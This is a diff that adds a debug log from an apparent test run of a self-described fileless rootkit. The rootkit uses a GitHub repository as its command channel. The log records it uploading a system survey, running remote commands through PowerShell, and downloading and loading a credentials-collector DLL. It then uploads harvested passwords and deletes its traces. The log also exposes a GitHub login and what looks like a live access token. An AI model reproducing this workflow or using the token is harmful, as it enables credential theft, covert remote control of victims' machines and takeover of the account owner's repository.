@@ -1,0 +1,104 @@
+Sat Aug 28 22:13:59 2021. Initialisation of the log file.
+
+DEBUG: Sat Aug 28 22:13:59 2021: GithubLogin: hidemepls785
+DEBUG: Sat Aug 28 22:13:59 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Sat Aug 28 22:13:59 2021: GihubAccessToken: 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
+DEBUG: Sat Aug 28 22:13:59 2021: Rootkit Name: CorepPreprod2
+DEBUG: Sat Aug 28 22:13:59 2021: Rootkit Registry Key: Sensors
+DEBUG: Sat Aug 28 22:13:59 2021: Run Registry Key Name: test
+DEBUG: Sat Aug 28 22:13:59 2021: Adding the actual location of the servant: C:\Users\gilles\Documents\mojo_dev\FilelessRootkit\Release\Payload.exe
+DEBUG: Sat Aug 28 22:14:02 2021: The folder list for random folder is not empty. Its size is: 2877
+DEBUG: Sat Aug 28 22:14:02 2021: The random path choosed for this execution is: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes
+DEBUG: Sat Aug 28 22:14:04 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Sat Aug 28 22:14:07 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:09 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:09 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Sat Aug 28 22:14:11 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:11 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Sat Aug 28 22:14:13 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:13 2021: The file that will be read weight: 4568
+DEBUG: Sat Aug 28 22:14:13 2021: Success to read the binary file. This number of bytes have been read: 4569
+DEBUG: Sat Aug 28 22:14:13 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Sat Aug 28 22:14:13 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:15 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:15 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Sat Aug 28 22:14:17 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\systeminfo.txt
+DEBUG: Sat Aug 28 22:14:17 2021: The file that will be read weight: 134
+DEBUG: Sat Aug 28 22:14:17 2021: Success to read the binary file. This number of bytes have been read: 135
+DEBUG: Sat Aug 28 22:14:17 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Sat Aug 28 22:14:17 2021: Start of the method writeFileWindowsApi.
+DEBUG: Sat Aug 28 22:14:17 2021: The content size that will be written: 4932
+DEBUG: Sat Aug 28 22:14:17 2021: Success to write the content(number of bytes : 4932) in the file : C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\gilles-survey.txt
+DEBUG: Sat Aug 28 22:14:17 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Aug 28 22:14:17 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\gilles-survey.txt
+DEBUG: Sat Aug 28 22:14:17 2021: The file that will be read weight: 4932
+DEBUG: Sat Aug 28 22:14:17 2021: Success to read the binary file. This number of bytes have been read: 4933
+DEBUG: Sat Aug 28 22:14:18 2021: The files gilles-survey.txt has been uploaded successfully in the github repo
+DEBUG: Sat Aug 28 22:14:18 2021: Success deleting the survey file.
+DEBUG: Sat Aug 28 22:14:18 2021: Start of a new loop to get commands and treat them.
+DEBUG: Sat Aug 28 22:14:18 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Sat Aug 28 22:14:18 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Sat Aug 28 22:14:18 2021: Success to check the commands with rootkit_path1
+DEBUG: Sat Aug 28 22:14:18 2021: Getting this command from the github repo: stay_alive
+DEBUG: Sat Aug 28 22:14:18 2021: Getting this command from the github repo: execute_cmd dir
+DEBUG: Sat Aug 28 22:14:18 2021: Getting this command from the github repo: password
+DEBUG: Sat Aug 28 22:14:18 2021: Start to treat the commands sent by the github repo.
+DEBUG: Sat Aug 28 22:14:18 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Sat Aug 28 22:14:18 2021: Command received: stay_alive
+DEBUG: Sat Aug 28 22:14:18 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sat Aug 28 22:14:18 2021: #####################################################
+
+DEBUG: Sat Aug 28 22:14:18 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Sat Aug 28 22:14:18 2021: Command received: execute_cmd
+DEBUG: Sat Aug 28 22:14:18 2021: The following command will be executed by powershell: dir > C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\target_command1.log
+DEBUG: Sat Aug 28 22:14:20 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\target_command1.log
+DEBUG: Sat Aug 28 22:14:20 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Sat Aug 28 22:14:22 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\target_command1.log
+DEBUG: Sat Aug 28 22:14:22 2021: The file that will be read weight: 2596
+DEBUG: Sat Aug 28 22:14:22 2021: Success to read the binary file. This number of bytes have been read: 2597
+DEBUG: Sat Aug 28 22:14:22 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Sat Aug 28 22:14:22 2021: Start of the method writeFileWindowsApi.
+DEBUG: Sat Aug 28 22:14:22 2021: The content size that will be written: 2597
+DEBUG: Sat Aug 28 22:14:22 2021: Success to write the content(number of bytes : 2597) in the file : C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\target_command1.log
+DEBUG: Sat Aug 28 22:14:22 2021: The file target_command.log exists, trying to upload it content.
+DEBUG: Sat Aug 28 22:14:22 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Aug 28 22:14:22 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\target_command1.log
+DEBUG: Sat Aug 28 22:14:22 2021: The file that will be read weight: 2597
+DEBUG: Sat Aug 28 22:14:22 2021: Success to read the binary file. This number of bytes have been read: 2598
+DEBUG: Sat Aug 28 22:14:23 2021: The files C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\target_command1.log has been uploaded successfully in the github repo
+DEBUG: Sat Aug 28 22:14:23 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sat Aug 28 22:14:23 2021: #####################################################
+
+DEBUG: Sat Aug 28 22:14:23 2021: The command stay_alive has been receive, the rootkit will not stop its execution.
+DEBUG: Sat Aug 28 22:14:23 2021: Command received: password
+DEBUG: Sat Aug 28 22:14:23 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Sat Aug 28 22:14:23 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Sat Aug 28 22:14:24 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Sat Aug 28 22:14:24 2021: The size of the content of the file is: 343040
+DEBUG: Sat Aug 28 22:14:24 2021: Start of the method writeFileWindowsApi.
+DEBUG: Sat Aug 28 22:14:24 2021: The content size that will be written: 343040
+DEBUG: Sat Aug 28 22:14:24 2021: Success to write the content(number of bytes : 343040) in the file : C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\CredentialsCollectorDll.dll
+DEBUG: Sat Aug 28 22:14:24 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\CredentialsCollectorDll.dll
+DEBUG: Sat Aug 28 22:14:24 2021: Success to have an handle to the credential dll.
+DEBUG: Sat Aug 28 22:14:24 2021: End of the execution of the password dll.
+DEBUG: Sat Aug 28 22:14:24 2021: The file that contains passwords has been created.
+DEBUG: Sat Aug 28 22:14:24 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Sat Aug 28 22:14:24 2021: Start of the method readFileWindowsApi for the file: C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\password_output.txt
+DEBUG: Sat Aug 28 22:14:24 2021: The file that will be read weight: 2350
+DEBUG: Sat Aug 28 22:14:24 2021: Success to read the binary file. This number of bytes have been read: 2351
+DEBUG: Sat Aug 28 22:14:25 2021: The files C:\Users\gilles\Documents\mojo_dev\Libraries\Credentials\rapidjson\msinttypes\password_output.txt has been uploaded successfully in the github repo
+DEBUG: Sat Aug 28 22:14:25 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: password_output.txt
+DEBUG: Sat Aug 28 22:14:25 2021: The file truely exists in the random folder.
+DEBUG: Sat Aug 28 22:14:25 2021: Success to delete the file. End of the method
+DEBUG: Sat Aug 28 22:14:25 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: chromepassword
+DEBUG: Sat Aug 28 22:14:25 2021: The file does not exist in the random folder. Aborting.
+DEBUG: Sat Aug 28 22:14:25 2021: Start of DeleteFileRandomFolder : Try to delete the file in the random folder: CredentialsCollectorDll.dll
+DEBUG: Sat Aug 28 22:14:25 2021: The file truely exists in the random folder.
+ERROR: Sat Aug 28 22:14:25 2021: Fail to delete the file. Here is the last windows error: 5
+DEBUG: Sat Aug 28 22:14:25 2021: End of the method messageManagerPasswordModule.
+DEBUG: Sat Aug 28 22:14:25 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Sat Aug 28 22:14:25 2021: #####################################################
+
+DEBUG: Sat Aug 28 22:14:25 2021: Start of GithubCommunication::sendResults
+DEBUG: Sat Aug 28 22:14:26 2021: The results was uploaded on the github repo
+DEBUG: Sat Aug 28 22:14:26 2021: Start of GithubCommunication::sendLogs
